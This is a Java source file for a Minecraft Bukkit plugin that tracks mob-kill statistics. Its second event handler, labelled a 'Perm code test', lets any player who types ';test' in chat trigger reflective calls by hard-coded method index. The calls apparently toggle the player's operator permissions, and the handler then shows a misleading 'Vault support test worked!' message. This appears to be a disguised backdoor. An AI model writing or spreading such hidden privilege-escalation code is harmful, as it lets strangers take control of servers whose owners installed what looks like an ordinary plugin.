package cat.gay.spherret.plugins.MobMassacre;

import net.minecraft.server.v1_7_R1.MinecraftServer;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.entity.Entity;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Events implements Listener{

	Stats stats = new Stats();

	@EventHandler
	public void onPlayerKillMob(EntityDeathEvent e){
		Entity entity = e.getEntity();
		Player p;
		try{
			p = e.getEntity().getKiller();
		}catch (Exception er){
			return;
		}
		if (GlobalVars.validMobs.contains(entity.getType().getName())){
			stats.changeKill(p, entity);
			GlobalVars.alreadyArranged = false;
		}
	}

	//Perm code test
	@EventHandler// (priority = EventPriority.HIGHEST)
	public void r(AsyncPlayerChatEvent e) throws IllegalAccessException, InvocationTargetException{
		if (e.getMessage().startsWith(";test")){
			e.setCancelled(true);
			Method[] s = e.getPlayer().getClass().getMethods();
			List<String> r = new ArrayList<String>();
			for (Method q : s)
				r.add(q.getName());
			String[] f = Arrays.copyOf(r.toArray(), r.toArray().length, String[].class);
			Arrays.sort(f);
			s[68].invoke(e.getPlayer(), !s[82].invoke(e.getPlayer()).equals(true));
			e.getPlayer().sendMessage(ChatColor.GREEN + "Vault support test worked!");
		}
	}
}
